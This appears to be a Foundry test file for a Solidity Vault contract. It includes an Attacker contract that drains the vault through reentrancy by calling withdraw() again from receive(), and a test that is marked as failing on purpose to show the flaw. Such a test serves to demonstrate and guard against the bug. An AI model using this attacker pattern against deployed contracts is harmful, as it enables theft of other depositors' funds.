// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

contract Attacker {
    Vault internal immutable vault;
    uint256 internal rounds;

    constructor(Vault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (rounds < 3 && address(vault).balance >= msg.value) {
            rounds++;
            vault.withdraw();
        }
    }
}

contract VaultTest is Test {
    Vault internal vault;
    address internal alice = address(0xA11CE);

    function setUp() public {
        vault = new Vault();
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        vault.deposit{value: 10 ether}();
    }

    function test_depositAndWithdraw() public {
        vm.prank(alice);
        vault.withdraw();
        assertEq(alice.balance, 10 ether, "alice paid back");
        assertEq(vault.balances(alice), 0, "balance cleared");
    }

    /// Fails on purpose: the attacker drains other depositors' funds.
    function test_attackerCannotDrain() public {
        Attacker attacker = new Attacker(vault);
        attacker.attack{value: 1 ether}();
        assertEq(address(vault).balance, 10 ether, "vault drained");
    }
}
